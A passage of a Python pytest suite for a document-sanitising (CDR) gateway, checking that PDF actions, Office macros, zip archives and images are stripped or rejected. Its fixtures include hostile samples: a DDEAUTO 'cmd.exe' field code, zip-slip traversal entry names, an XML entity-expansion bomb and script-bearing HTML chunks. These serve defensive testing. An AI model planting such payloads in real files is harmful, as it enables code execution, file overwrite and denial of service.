            inner = pdf.make_indirect(self._form(pdf, self.INLINE))
            outer = self._form(pdf, b"/Inner Do\n", Resources=pikepdf.Dictionary(
                XObject=pikepdf.Dictionary(Inner=inner)))
            return pikepdf.Dictionary(
                XObject=pikepdf.Dictionary(Outer=pdf.make_indirect(outer)))

        self._assert_rejected(self._resourced(resources), "form nested inside a form")

    def test_form_xobject_without_subtype_rejected(self):
        # /Subtype is attacker-controlled: omitting it must not disable the sweep.
        raw = self._resourced(lambda pdf: pikepdf.Dictionary(
            XObject=pikepdf.Dictionary(
                F0=pdf.make_indirect(self._form(pdf, self.INLINE, subtype=None)))))
        self._assert_rejected(raw, "form XObject with no /Subtype")

    def test_type3_charproc_rejected(self):
        # Type3 glyph procedures are content streams reached via /Font, not /XObject.
        def resources(pdf):
            glyph = pdf.make_indirect(pdf.make_stream(self.INLINE))
            return pikepdf.Dictionary(Font=pikepdf.Dictionary(
                F1=pdf.make_indirect(pikepdf.Dictionary(
                    Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
                    FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, 0]),
                    CharProcs=pikepdf.Dictionary(a=glyph),
                    Encoding=pikepdf.Dictionary()))))

        self._assert_rejected(self._resourced(resources), "Type3 /CharProcs glyph")

    def test_tiling_pattern_rejected(self):
        def resources(pdf):
            pattern = pdf.make_stream(self.INLINE)
            for key, value in (("/PatternType", 1), ("/XStep", 16), ("/YStep", 16),
                               ("/PaintType", 1), ("/TilingType", 1)):
                pattern[pikepdf.Name(key)] = value
            pattern[pikepdf.Name("/BBox")] = pikepdf.Array([0, 0, 16, 16])
            return pikepdf.Dictionary(
                Pattern=pikepdf.Dictionary(P0=pdf.make_indirect(pattern)))

        self._assert_rejected(self._resourced(resources), "tiling /Pattern")

    def test_extgstate_softmask_group_rejected(self):
        def resources(pdf):
            group = pdf.make_indirect(self._form(pdf, self.INLINE))
            return pikepdf.Dictionary(ExtGState=pikepdf.Dictionary(
                GS0=pikepdf.Dictionary(S=pikepdf.Name("/Luminosity"),
                                       SMask=pikepdf.Dictionary(
                                           S=pikepdf.Name("/Luminosity"), G=group))))

        self._assert_rejected(self._resourced(resources), "ExtGState /SMask /G group")

    def test_annotation_appearance_stream_rejected(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        appearance = pdf.make_indirect(self._form(pdf, self.INLINE))
        pdf.pages[0].obj["/Annots"] = pikepdf.Array([pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Widget"),
            Rect=pikepdf.Array([0, 0, 16, 16]),
            AP=pikepdf.Dictionary(N=appearance)))])
        self._assert_rejected(self._serialise(pdf), "annotation /AP /N")

    def test_binary_stream_does_not_break_the_sweep(self):
        # The sweep now walks EVERY stream, including embedded-file streams whose bytes
        # are not content-stream operators at all. Decoding those raised UnicodeDecodeError
        # mid-sweep; the fix tolerates the junk without also swallowing real rejections.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        binary = pdf.make_stream(bytes(range(256)) * 4)
        binary[pikepdf.Name("/Type")] = pikepdf.Name("/EmbeddedFile")
        pdf.Root[pikepdf.Name("/Names")] = pikepdf.Dictionary(
            EmbeddedFiles=pikepdf.Dictionary(Names=pikepdf.Array([
                pikepdf.String("blob.bin"),
                pdf.make_indirect(pikepdf.Dictionary(
                    Type=pikepdf.Name("/Filespec"), F=pikepdf.String("blob.bin"),
                    EF=pikepdf.Dictionary(F=pdf.make_indirect(binary)))),
            ])))
        clean, _ = cdr.cdr_pdf(self._serialise(pdf))
        assert clean, "a binary stream broke the inline risky-image sweep"

    def test_risky_stream_under_nonstandard_catalog_key_neutralised(self):
        # The stream sweep walks the graph rather than enumerating known containers, so a
        # risky stream parked under a catalog key that appears in no spec table is still
        # reached. (A genuinely unreferenced stream cannot be used as the fixture here:
        # pikepdf garbage-collects it on save, so the payload never reaches the input —
        # verified. Hanging it off a private key keeps it in the file while keeping it
        # off every standard traversal path.)
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        stream = pdf.make_stream(b"\x00\x00\x00\x00")
        for key, value in (("/Type", pikepdf.Name("/XObject")),
                           ("/Subtype", pikepdf.Name("/Image")),
                           ("/Width", 16), ("/Height", 16), ("/BitsPerComponent", 1),
                           ("/ColorSpace", pikepdf.Name("/DeviceGray")),
                           ("/Filter", pikepdf.Name("/JBIG2Decode"))):
            stream[pikepdf.Name(key)] = value
        pdf.Root[pikepdf.Name("/CDRProbe")] = pdf.make_indirect(stream)
        raw = self._serialise(pdf)
        assert b"JBIG2Decode" in raw  # precondition: the payload really is in the input
        clean, report = cdr.cdr_pdf(raw)
        assert any("risky image filter" in r for r in report["removed"]), \
            "risky stream under a non-standard catalog key was not swept"
        assert b"JBIG2Decode" not in clean

    def test_ordinary_inline_image_preserved(self):
        # False-positive guard: inline images are commonplace. Only the risky decoder
        # filters trigger rejection; a plain uncompressed inline image must pass.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Contents = pdf.make_stream(
            b"BI /W 2 /H 2 /BPC 8 /CS /G ID \x00\xff\xff\x00 EI\n")
        clean, _ = cdr.cdr_pdf(self._serialise(pdf))
        assert clean, "an ordinary inline image was rejected"


class TestAnnotationActionCoverageClaims:
    """Pin the action types claimed as covered by the *unconditional* annotation
    `/A`//`/AA` delete in `_strip_pdf_page`, rather than by any per-type denylist.

    These were asserted as "already handled" while auditing the malicious-pdf taxonomy —
    read off the code, not executed. That is precisely the reasoning that produced two
    wrong claims in the same review (the `/Thread` coverage boundary, and a `/FontMatrix`
    sweep gated on an attacker-controlled `/Subtype`), so each is now executed. All pass
    against the current code: these are lock-in tests, not bug reports. Their value is
    that a future refactor narrowing the sweep back to a denylist fails here loudly —
    which is the exact regression pitfall #26 warns about."""

    def _pdf_with_annot_action(self, action: dict) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Link"),
            Rect=pikepdf.Array([0, 0, 9, 9]),
            A=pikepdf.Dictionary(**action),
        ))
        pdf.pages[0].obj["/Annots"] = pikepdf.Array([annot])
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        return buf.getvalue()

    @pytest.mark.parametrize("label,action,marker", [
        ("/GoToE", {"S": pikepdf.Name("/GoToE"),
                    "F": pikepdf.String("GOTOEMARK")}, b"GOTOEMARK"),
        ("/Rendition", {"S": pikepdf.Name("/Rendition"), "OP": 0,
                        "JS": pikepdf.String("RENDITIONMARK")}, b"RENDITIONMARK"),
        ("/SetOCGState", {"S": pikepdf.Name("/SetOCGState"),
                          "State": pikepdf.Array([pikepdf.Name("/OFF"),
                                                  pikepdf.String("OCGMARK")])}, b"OCGMARK"),
        ("/ImportData", {"S": pikepdf.Name("/ImportData"),
                         "F": pikepdf.String("IMPORTMARK")}, b"IMPORTMARK"),
        ("/Launch", {"S": pikepdf.Name("/Launch"),
                     "F": pikepdf.String("LAUNCHMARK")}, b"LAUNCHMARK"),
        ("/SubmitForm", {"S": pikepdf.Name("/SubmitForm"), "Flags": 4,
                         "F": pikepdf.String("SUBMITMARK")}, b"SUBMITMARK"),
        ("/URI", {"S": pikepdf.Name("/URI"),
                  "URI": pikepdf.String("http://URIMARK.invalid")}, b"URIMARK"),
        ("/GoToR", {"S": pikepdf.Name("/GoToR"),
                    "F": pikepdf.String("GOTORMARK")}, b"GOTORMARK"),
    ])
    def test_annotation_action_type_removed(self, label, action, marker):
        raw = self._pdf_with_annot_action(action)
        assert marker in raw, f"fixture invalid: {label} marker not in input"
        clean, report = cdr.cdr_pdf(raw)
        assert marker not in clean, f"{label} annotation action survived CDR"
        assert any("annot/A" in r for r in report["removed"])

    def test_chained_next_action_removed(self):
        # An action can carry a /Next follow-on chain; deleting the whole /A takes the
        # chain with it, which a per-type denylist walking only /S would miss.
        raw = self._pdf_with_annot_action({
            "S": pikepdf.Name("/URI"),
            "URI": pikepdf.String("http://first.invalid"),
            "Next": pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                       JS=pikepdf.String("NEXTCHAINMARK")),
        })
        assert b"NEXTCHAINMARK" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"NEXTCHAINMARK" not in clean, "/Next action chain survived CDR"
        assert any("annot/A" in r for r in report["removed"])

    def test_catalog_additional_action_removed(self):
        # Document-level /AA (e.g. /WC will-close) is separate from page and annot /AA.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.Root["/AA"] = pikepdf.Dictionary(
            WC=pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                  JS=pikepdf.String("CATALOGAAMARK")))
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        raw = buf.getvalue()
        assert b"CATALOGAAMARK" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"CATALOGAAMARK" not in clean, "catalog /AA survived CDR"
        assert "/AA" in report["removed"]

    def test_xfa_as_stream_array_removed(self):
        # /XFA is commonly an array of [name, stream] pairs rather than a single stream.
        # compress_streams=False so the payload is greppable in the input — otherwise the
        # precondition silently passes on a deflated stream and the test proves nothing.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        xfa = pdf.make_stream(b"<xdp><script>XFASTREAMMARK</script></xdp>")
        pdf.Root["/AcroForm"] = pikepdf.Dictionary(
            Fields=pikepdf.Array([]),
            XFA=pikepdf.Array([pikepdf.String("form"), pdf.make_indirect(xfa)]))
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        raw = buf.getvalue()
        assert b"XFASTREAMMARK" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"XFASTREAMMARK" not in clean, "XFA stream array survived CDR"
        assert "AcroForm/XFA" in report["removed"]


# ══════════════════════════════════════════════════════════════════════════════
# Production-robustness audit (2026-07): availability, encoding, and package-
# structure findings. Each test below pins a defect that was reproduced against
# the pre-fix code — see the "Production robustness audit" pitfalls entry.
# ══════════════════════════════════════════════════════════════════════════════


class TestAggregateDecompressionBudget:
    """Per-entry caps do not bound a package's TOTAL decompressed size. A package of
    individually-legal entries measured ~107 GB from a 105 MB upload — minutes of
    inflate+re-deflate against a 300 s timeout, then EventBridge retries it."""

    @staticmethod
    def _many_entry_zip(n: int, size: int) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            for i in range(n):
                z.writestr(f"word/f{i}.dat", b"\0" * size)
        return buf.getvalue()

    def test_aggregate_budget_trips_when_total_exceeds_limit(self):
        data = self._many_entry_zip(10, 1024 * 1024)  # 10 MB total, each entry legal
        with patch.object(cdr, "_MAX_TOTAL_ENTRY_BYTES", 4 * 1024 * 1024):
            with pytest.raises(cdr.CdrReject, match="total decompression budget"):
                cdr.cdr_office(data, "docx")

    def test_entry_under_per_entry_cap_still_counted_toward_total(self):
        """Every entry here is far below _MAX_ENTRY_BYTES — the trip must come from the
        aggregate, proving the total is enforced independently of the per-entry cap."""
        data = self._many_entry_zip(10, 1024 * 1024)
        assert cdr._MAX_ENTRY_BYTES > 10 * 1024 * 1024
        with patch.object(cdr, "_MAX_TOTAL_ENTRY_BYTES", 4 * 1024 * 1024):
            with pytest.raises(cdr.CdrReject, match="total decompression budget"):
                cdr.cdr_office(data, "docx")

    def test_normal_package_unaffected_by_budget(self):
        clean, report = cdr.cdr_office(_make_docx_with_macro(), "docx")
        assert clean
        assert "word/vbaProject.bin" not in zipfile.ZipFile(io.BytesIO(clean)).namelist()

    def test_xlsb_prereads_share_the_aggregate_budget(self):
        with patch.object(cdr, "_MAX_TOTAL_ENTRY_BYTES", 8):
            with pytest.raises(cdr.CdrReject, match="total decompression budget"):
                cdr.cdr_xlsb(_make_xlsb())


class TestZipEntryCountCap:
    def test_too_many_entries_hard_rejected(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            for i in range(50):
                z.writestr(f"word/p{i}.xml", "<a/>")
        with patch.object(cdr, "_MAX_ZIP_ENTRIES", 10):
            valid, anomalies = cdr._validate_zip_structure(buf.getvalue())
        assert valid is False
        assert "too many ZIP entries" in anomalies[0]

    def test_normal_entry_count_accepted(self):
        valid, _ = cdr._validate_zip_structure(_make_docx_with_macro())
        assert valid is True


class TestUnsafeZipEntryNames:
    """A traversal/absolute entry name is never a legitimate OPC part. Before the fix it
    passed validation and was written verbatim into SANITISED_BUCKET — the gateway
    handing a zip-slip archive to every downstream consumer, stamped 'sanitised'."""

    @staticmethod
    def _zip_named(name: str) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr(name, "<a/>")
        return buf.getvalue()

    @pytest.mark.parametrize("name", [
        "../../../../tmp/evil.xml",
        "word/../../evil.xml",
        "/abs/evil.xml",
        "C:/windows/evil.xml",
        "..\\..\\evil.xml",
    ])
    def test_unsafe_name_hard_rejected(self, name):
        valid, anomalies = cdr._validate_zip_structure(self._zip_named(name))
        assert valid is False, f"{name!r} was accepted"
        assert "unsafe ZIP entry name" in anomalies[0]

    def test_ordinary_names_accepted(self):
        valid, anomalies = cdr._validate_zip_structure(self._zip_named("word/document.xml"))
        assert valid is True, anomalies


class TestDuplicateEntryCanonicalisation:
    """Word resolves './word/document.xml' and 'word/document.xml' to the SAME part, so a
    raw-string duplicate check let an attacker ship two colliding entries: the consumer
    opens one, CDR reports on the other."""

    @staticmethod
    def _dup(a: str, b: str) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr(a, "<a>benign</a>")
            z.writestr(b, "<a>malicious</a>")
        return buf.getvalue()

    @pytest.mark.parametrize("a,b", [
        ("word/document.xml", "./word/document.xml"),
        ("word/document.xml", "word//document.xml"),
        ("word/document.xml", "WORD/Document.xml"),
    ])
    def test_path_equivalent_duplicates_rejected(self, a, b):
        valid, anomalies = cdr._validate_zip_structure(self._dup(a, b))
        assert valid is False, f"{a!r} vs {b!r} accepted as distinct"
        assert "duplicate ZIP entry" in anomalies[0]

    def test_traversal_form_of_a_duplicate_also_rejected(self):
        """'word/sub/../document.xml' collides with 'word/document.xml' after
        canonicalisation, but the unsafe-name check fires first — either verdict is a
        hard reject, which is what matters."""
        valid, anomalies = cdr._validate_zip_structure(
            self._dup("word/document.xml", "word/sub/../document.xml"))
        assert valid is False
        assert ("duplicate ZIP entry" in anomalies[0]
                or "unsafe ZIP entry name" in anomalies[0])

    def test_genuinely_distinct_parts_accepted(self):
        valid, anomalies = cdr._validate_zip_structure(
            self._dup("word/document.xml", "word/settings.xml"))
        assert valid is True, anomalies


class TestXmlPartEncoding:
    """Every neutralisation pass runs on decoded text. Decoding a UTF-16 part as UTF-8
    turned 'DDEAUTO' into 'D\\x00D\\x00E\\x00…', which no keyword regex matches — the part
    sailed through untouched. And errors='replace' destroyed legitimate non-UTF-8 bytes."""

    DOC = ('<?xml version="1.0" encoding="{decl}"?><w:document xmlns:w="x">'
           '<w:instrText>DDEAUTO c:\\\\cmd.exe "/c calc"</w:instrText></w:document>')

    @pytest.mark.parametrize("enc,decl,bom", [
        ("utf-16-le", "UTF-16", b"\xff\xfe"),
        ("utf-16-be", "UTF-16", b"\xfe\xff"),
    ])
    def test_utf16_part_is_scrubbed_and_stays_valid(self, enc, decl, bom):
        raw = bom + self.DOC.format(decl=decl).encode(enc)
        out, removed = cdr._strip_xml_macros(raw, "word/document.xml")
        assert removed, "UTF-16 part evaded the scrub entirely"
        assert out.startswith(bom), "BOM lost — part no longer decodable as declared"
        text = out.decode(enc)
        assert "cmd.exe" not in text
        assert "_CDR_REMOVED_" in text
        ET.fromstring(out)  # must still parse

    def test_utf8_bom_part_scrubbed_and_bom_preserved(self):
        raw = self.DOC.format(decl="UTF-8").encode("utf-8-sig")
        out, removed = cdr._strip_xml_macros(raw, "d.xml")
        assert removed
        assert out.startswith(b"\xef\xbb\xbf")
        assert "cmd.exe" not in out.decode("utf-8-sig")
        ET.fromstring(out)

    def test_latin1_part_round_trips_losslessly(self):
        """errors='replace' rewrote every undecodable byte to U+FFFD and wrote that back
        out — silent corruption of a clean document."""
        raw = '<w:t>caf\xe9 na\xefve r\xe9sum\xe9</w:t>'.encode("latin-1")
        out, removed = cdr._strip_xml_macros(raw, "d.xml")
        assert out == raw, "non-UTF-8 bytes were corrupted by the scrub"
        assert removed == []

    def test_plain_utf8_unchanged(self):
        raw = '<w:t>caf\xe9 \u4e2d\u6587</w:t>'.encode("utf-8")
        out, _ = cdr._strip_xml_macros(raw, "d.xml")
        assert out == raw


class TestXmlDoctypeRejected:
    """OPC forbids a DTD in any package part; it is also the entity-expansion
    amplification vector against the ElementTree parses (verified ~1000x expansion)."""

    BOMB = (b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "AAAAAAAAAA">'
            b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
            b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            b'<Default Extension="xml" ContentType="&b;"/></Types>')

    def test_doctype_in_content_types_rejected(self):
        with pytest.raises(cdr.CdrReject, match="DTD"):
            cdr._sanitise_content_types(self.BOMB)

    def test_doctype_in_rels_rejected(self):
        with pytest.raises(cdr.CdrReject, match="DTD"):
            cdr._strip_rels(self.BOMB)

    def test_doctype_in_xml_part_rejected(self):
        with pytest.raises(cdr.CdrReject, match="DTD"):
            cdr._strip_xml_macros(self.BOMB, "word/document.xml")

    def test_dispatch_maps_reject_to_rejected_not_error(self):
        """A deterministic verdict must hard-reject (quarantine + delete source), not
        raise into the retry path — retrying input that always fails is pure waste and
        multiplies the attacker's cost-per-upload by the retry count."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("word/document.xml", self.BOMB)
        result = cdr.cdr_dispatch(buf.getvalue(), "docx")
        assert result["status"] == "rejected"
        assert "DTD" in result["reason"]
        assert result["delete_source"] is True

    def test_clean_package_not_affected(self):
        clean, _ = cdr.cdr_office(_make_docx_with_macro(), "docx")
        assert clean


class TestAltChunkPayloadPartDropped:
    """The aFChunk rel was dropped and the element neutralised, but the imported HTML
    part itself stayed in the package and rode into SANITISED_BUCKET intact."""

    @staticmethod
    def _docx_with_chunk(name: str) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr(name, b"<html><script>alert(1)</script></html>")
            z.writestr("word/document.xml", '<w:document xmlns:w="x"><w:body/></w:document>')
        return buf.getvalue()

    @pytest.mark.parametrize("name", [
        "word/afchunk.htm", "word/afchunk.html", "word/chunk.mht",
        "word/chunk.mhtml", "word/chunk.xhtml",
    ])
    def test_html_payload_part_removed(self, name):
        clean, report = cdr.cdr_office(self._docx_with_chunk(name), "docx")
        names = zipfile.ZipFile(io.BytesIO(clean)).namelist()
        assert name not in names, f"{name} survived into the sanitised output"
        assert b"alert(1)" not in clean
        assert any(name in r for r in report["removed"])


class TestVmlPartScrubbed:
    """VML drawing parts are XML carrying the same action attributes and field-code
    carriers the scrub targets, but only '.xml' was matched — every vmlDrawing*.vml
    part went through unscrubbed."""

    def test_vml_action_attribute_and_field_code_removed(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("word/drawings/vmlDrawing1.vml",
                       b'<v:shape onClick="evil()">'
                       b'<w:instrText>DDEAUTO c:\\\\cmd.exe "/c calc"</w:instrText></v:shape>')
        clean, report = cdr.cdr_office(buf.getvalue(), "docx")
        vml = zipfile.ZipFile(io.BytesIO(clean)).read("word/drawings/vmlDrawing1.vml")
        assert b"onClick" not in vml
        assert b"cmd.exe" not in vml
        assert b"_CDR_REMOVED_" in vml
        assert any("vmlDrawing1.vml" in r for r in report["removed"])


class TestAnimatedImageResourceCaps:
    """MAX_IMAGE_PIXELS bounds ONE frame; nothing bounded the total, and cdr_image
    materialises every frame at once — a handful of large frames reaches the container
    memory ceiling from a small upload."""

    @staticmethod
    def _animated_gif(frames: int, size: tuple = (32, 32)) -> bytes:
        # Frames must be visually distinct, or Pillow collapses them on save.
        imgs = [Image.new("RGB", size, (i * 20 % 256, i * 7 % 256, 0)) for i in range(frames)]
        buf = io.BytesIO()
        imgs[0].save(buf, format="GIF", save_all=True, append_images=imgs[1:],
                     duration=100, loop=0)
        return buf.getvalue()

    def test_frame_count_cap_enforced(self):
        data = self._animated_gif(12)
        with patch.object(cdr, "_MAX_IMAGE_FRAMES", 5):
            with pytest.raises(cdr.CdrReject, match="frame cap"):
                cdr.cdr_image(data, "gif")

    def test_total_pixel_budget_enforced(self):
        data = self._animated_gif(10, (64, 64))
        with patch.object(cdr, "_MAX_TOTAL_IMAGE_PIXELS", 64 * 64 * 3):
            with pytest.raises(cdr.CdrReject, match="total pixel budget"):
                cdr.cdr_image(data, "gif")

    def test_normal_animation_still_processed_with_all_frames(self):
        data = self._animated_gif(5)
        clean, report = cdr.cdr_image(data, "gif")
        out = Image.open(io.BytesIO(clean))
        assert getattr(out, "n_frames", 1) == 5, "frames lost"


class TestDownloadContentTypeFallback:
    def test_missing_content_type_does_not_raise(self):
        """Objects stored without a Content-Type made _download raise KeyError, turning a
        successful download into a retry/DLQ trip."""
        body = MagicMock()
        body.read.return_value = b"data"
        with patch.object(cdr, "s3") as m:
            m.get_object.return_value = {"Body": body, "ContentLength": 4}
            data, ct = cdr._download("b", "k")
        assert data == b"data"
        assert ct == "application/octet-stream"

    def test_content_type_used_when_present(self):
        body = MagicMock()
        body.read.return_value = b"data"
        with patch.object(cdr, "s3") as m:
            m.get_object.return_value = {"Body": body, "ContentLength": 4,
                                         "ContentType": "application/pdf"}
            _, ct = cdr._download("b", "k")
        assert ct == "application/pdf"


class TestExtensionFromBasename:
    def test_dot_in_directory_name_is_not_an_extension(self):
        """'reports.v2/summary' previously yielded ext 'v2/summary'."""
        event = {"detail": {"bucket": {"name": "src"}, "object": {"key": "reports.v2/summary",
                                                                 "size": 10}}}
        with patch.object(cdr, "_download", return_value=(b"x", "text/plain")), \
             patch.object(cdr, "_upload"), \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "_delete_source_safe"), \
             patch.object(cdr, "_emit_passthrough_metric") as metric:
            result = cdr.handler(event, None)
        assert result["status"] == "unsupported-format"
        metric.assert_called_once_with("")


class TestSanitisedOutputNeverEmpty:
    def test_empty_cdr_output_is_not_labelled_sanitised(self):
        """A 'sanitised' verdict with no payload must never reach SANITISED_BUCKET."""
        with patch.object(cdr, "cdr_pdf", return_value=(b"", {"removed": []})):
            with pytest.raises(ValueError, match="refusing to label empty content"):
                cdr.cdr_dispatch(b"%PDF-1.4", "pdf")


class TestResourceCapsRejectNotRetry:
    """Resource-cap trips are deterministic verdicts, not transient errors.

    A bomb fails identically on every retry, so escaping as an error would burn the
    full EventBridge retry budget and hold a reserved-concurrency slot each time
    (pitfall #46).
    """

    def _bomb(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                   'package/2006/content-types"><Default Extension="xml" '
                   'ContentType="application/xml"/></Types>')
            z.writestr("word/document.xml", b"\x00" * (cdr._MAX_ENTRY_BYTES + 1024))
        return buf.getvalue()

    def test_oversized_entry_dispatches_to_rejected(self):
        result = cdr.cdr_dispatch(self._bomb(), "docx")
        assert result["status"] == "rejected"
        assert result["delete_source"] is True
        assert "exceeds decompression limit" in result["reason"]

    def test_aggregate_budget_trip_dispatches_to_rejected(self, monkeypatch):
        monkeypatch.setattr(cdr, "_MAX_TOTAL_ENTRY_BYTES", 4096)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                   'package/2006/content-types"><Default Extension="xml" '
                   'ContentType="application/xml"/></Types>')
            for i in range(8):
                z.writestr(f"word/part{i}.xml", b"<a>" + b"\x20" * 2048 + b"</a>")
        result = cdr.cdr_dispatch(buf.getvalue(), "docx")
        assert result["status"] == "rejected"
        assert "total decompression budget" in result["reason"]

    def test_aggregate_budget_default_fits_under_lambda_memory(self):
        assert cdr._MAX_TOTAL_ENTRY_BYTES <= 512 * 1024 * 1024


class TestPillowDecoderAllowlist:
    """Pitfall #47 — IMAGE_EXTS gates which *extensions* route into cdr_image, but
    Image.open() picks its decoder by sniffing CONTENT. Without an explicit formats=
    allowlist the extension constrains only the save format, leaving every plugin in
    Pillow's registry reachable by naming a hostile file .png. Not a disarm bypass (output
    is still re-encoded) but a native-code attack-surface amplification: the attacker
    chooses which C decoder parses their bytes."""

    # Formats Pillow can both write and read, none of them in IMAGE_EXTS.
    UNINTENDED = ["PCX", "TGA", "SGI", "DDS", "PPM", "IM", "SPIDER"]

    @staticmethod
    def _encode(fmt: str) -> bytes | None:
        buf = io.BytesIO()
        try:
            Image.new("RGB", (8, 8), (255, 0, 0)).save(buf, format=fmt)
        except Exception:
            return None  # plugin not writable in this Pillow build
        return buf.getvalue()

    @pytest.mark.parametrize("fmt", UNINTENDED)
    def test_unintended_decoder_rejected_under_allowed_extension(self, fmt):
        data = self._encode(fmt)
        if data is None:
            pytest.skip(f"{fmt} not writable in this Pillow build")
        with pytest.raises(cdr.CdrReject):
            cdr.cdr_image(data, "png")

    @pytest.mark.parametrize("fmt", UNINTENDED)
    def test_unintended_decoder_dispatches_to_rejected(self, fmt):
        """The reject must surface as a deterministic 'rejected' disposition, not an
        error — an error re-raises and burns the EventBridge retry budget on input that
        fails identically every time."""
        data = self._encode(fmt)
        if data is None:
            pytest.skip(f"{fmt} not writable in this Pillow build")
        result = cdr.cdr_dispatch(data, "png")
        assert result["status"] == "rejected"
        assert result["delete_source"] is True

    @pytest.mark.parametrize("ext,fmt", [
        ("png", "PNG"), ("jpg", "JPEG"), ("jpeg", "JPEG"), ("tiff", "TIFF"),
        ("webp", "WEBP"), ("gif", "GIF"), ("bmp", "BMP"),
    ])
    def test_all_intended_formats_still_decode(self, ext, fmt):
        buf = io.BytesIO()
        Image.new("RGB", (16, 16), (0, 128, 255)).save(buf, format=fmt)
        clean, report = cdr.cdr_image(buf.getvalue(), ext)
        assert clean, f"{fmt} produced no output"
        assert report["format"] == ext

    def test_extension_content_mismatch_among_allowed_formats_tolerated(self):
        """Deliberately NOT pinned to the declared extension: mismatch among the seven
        allowed formats is common in legitimate files, and rejecting real business
        documents is a production incident, not a security win."""
        buf = io.BytesIO()
        Image.new("RGB", (16, 16), (255, 0, 0)).save(buf, format="TIFF")
        clean, _ = cdr.cdr_image(buf.getvalue(), "png")
        assert Image.open(io.BytesIO(clean)).format == "PNG"

    def test_allowlist_matches_image_exts(self):
        """_PILLOW_FORMATS and IMAGE_EXTS must not drift apart."""
        mapped = {"jpg": "JPEG", "jpeg": "JPEG", "png": "PNG", "bmp": "BMP",
                  "tiff": "TIFF", "webp": "WEBP", "gif": "GIF"}
        assert {mapped[e] for e in cdr.IMAGE_EXTS} == set(cdr._PILLOW_FORMATS)


class TestPdfMagicGuard:
    """Pitfall #47 — the Office path validates magic + structure before zlib touches
    anything; PDF handed raw bytes straight to QPDF's C++ parser behind only the size cap."""

    def test_non_pdf_bytes_rejected(self):
        with pytest.raises(cdr.CdrReject):
            cdr.cdr_pdf(b"NOTAPDF" * 200)

    def test_non_pdf_dispatches_to_rejected(self):
        result = cdr.cdr_dispatch(b"NOTAPDF" * 200, "pdf")
        assert result["status"] == "rejected"
        assert result["delete_source"] is True

    def test_empty_input_rejected(self):
        with pytest.raises(cdr.CdrReject):
            cdr.cdr_pdf(b"")

    def test_real_pdf_still_accepted(self):
        clean, report = cdr.cdr_pdf(_make_pdf_with_js())
        assert clean.startswith(b"%PDF-")
        assert report["format"] == "pdf"

    def test_header_within_first_1024_bytes_accepted(self):
        """The spec allows the header at a small offset; the pdf.save() rebuild drops the
        leading prefix anyway, so match the spec rather than requiring offset 0."""
        prefixed = b"\n" * 200 + _make_pdf_with_js()
        clean, _ = cdr.cdr_pdf(prefixed)
        assert clean.startswith(b"%PDF-")

    def test_header_beyond_1024_bytes_rejected(self):
        with pytest.raises(cdr.CdrReject):
            cdr.cdr_pdf(b"\x00" * 2048 + _make_pdf_with_js())


class TestIccProfilePurged:
    """Pitfall #48 — the PNG and TIFF encoders pull `icc_profile` from the image's info
    dict (which survives .convert()/.copy()) and re-embed it unless explicitly overridden.
    An attacker-supplied ICC blob rode through a "sanitised" image while report["removed"]
    claimed it had been stripped: a sanitisation failure AND a false audit record. ICC is
    arbitrary-length attacker-controlled data and a historical CMS-parser RCE surface."""

    @staticmethod
    def _icc() -> bytes:
        from PIL import ImageCms
        return ImageCms.ImageCmsProfile(ImageCms.createProfile("sRGB")).tobytes()

    @pytest.mark.parametrize("ext,fmt", [
        ("png", "PNG"), ("tiff", "TIFF"), ("jpg", "JPEG"),
        ("webp", "WEBP"), ("gif", "GIF"),
    ])
    def test_icc_stripped_single_frame(self, ext, fmt):
        buf = io.BytesIO()
